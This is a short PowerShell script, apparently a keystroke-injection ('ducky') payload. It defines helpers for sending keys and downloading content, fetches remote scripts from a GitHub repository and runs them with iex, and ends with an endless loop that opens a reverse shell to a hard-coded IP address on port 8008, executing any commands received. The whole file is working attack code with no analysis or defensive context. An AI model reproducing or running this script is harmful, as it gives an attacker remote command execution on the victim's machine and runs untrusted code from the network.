[net.servicepointmanager]::securityprotocol = [net.securityprotocoltype]::Tls12
function k([string]$a){(new-object -comobject wscript.shell).sendkeys($a)}
function popup([string]$text,[int]$timeout,[string]$title){(new-object -comobject wscript.shell).popup($text,$timeout,$title)}
function ds([string]$a){(new-object net.webclient).downloadstring($a)}
function df([string]$a,[string]$b){(new-object net.webclient).downloadfile($a, $b)}
function signature{notepad;sleep 1;iex (ds http://raw.githubusercontent.com/computer-geek64/ducky/master/powershell_signatures/kali_powershell)}
iex (ds "http://raw.githubusercontent.com/computer-geek64/ducky/master/dependencies/audio.ps1")
#while($true){iex (ds "http://raw.githubusercontent.com/computer-geek64/ducky/master/dynamic-connection");sleep 15}
while($true){$sm=(New-Object Net.Sockets.TCPClient("143.215.62.27",8008)).GetStream();[byte[]]$bt=0..65535|%{0};while(($i=$sm.Read($bt,0,$bt.Length)) -ne 0){;$d=(New-Object Text.ASCIIEncoding).GetString($bt,0,$i);$st=([text.encoding]::ASCII).GetBytes(("$(iex $d)`n$(pwd)> " 2>&1));$sm.Write($st,0,$st.Length)};sleep 15}
